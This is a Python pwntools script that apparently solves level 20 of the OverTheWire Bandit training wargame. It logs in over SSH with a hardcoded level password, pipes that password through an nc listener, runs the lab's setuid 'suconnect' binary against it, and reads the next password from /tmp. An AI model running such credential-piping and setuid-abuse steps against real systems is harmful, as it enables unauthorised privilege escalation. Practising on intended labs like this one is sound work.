#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms
from time import sleep

level = 20
user = 'bandit%s' % level
host = 'bandit.labs.overthewire.org'
password = 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j'
port = 2220

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

sh = connectToLevel()
p = sh.process("echo %s | nc -l 4445 > /tmp/level20pass.txt 2>&1" % password,shell=True)

_sh = connectToLevel()
p = _sh.process("./suconnect 4445",shell=True)

__sh = connectToLevel()
p = __sh.process("cat /tmp/level20pass.txt",shell=True)
log.info('Flag = %s' % p.recvline())
